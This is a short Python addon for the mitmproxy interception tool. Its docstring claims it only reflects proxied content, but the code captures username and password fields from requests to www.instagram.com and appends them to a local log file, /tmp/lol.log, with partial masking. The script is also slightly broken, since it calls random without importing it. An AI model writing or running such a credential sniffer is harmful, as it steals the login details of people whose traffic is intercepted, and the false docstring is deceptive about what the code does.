"""
This script reflects all content passing through the proxy.
"""

import re
import urllib
from urllib.parse import unquote
from mitmproxy import http


def response(flow: http.HTTPFlow) -> None:
    if flow.request.pretty_host == 'www.instagram.com':
        data = re.findall(b'(password=[^&]*|username=[^&]*)', flow.request.content)
        if data:
            with open('/tmp/lol.log', 'a') as f:
                sanitized = re.sub("(word=\w).*?(\w)'", '\\1' + '*' * random.randint(5, 10) + '\\2', str(data))
                f.write(str(sanitized) + '\n')

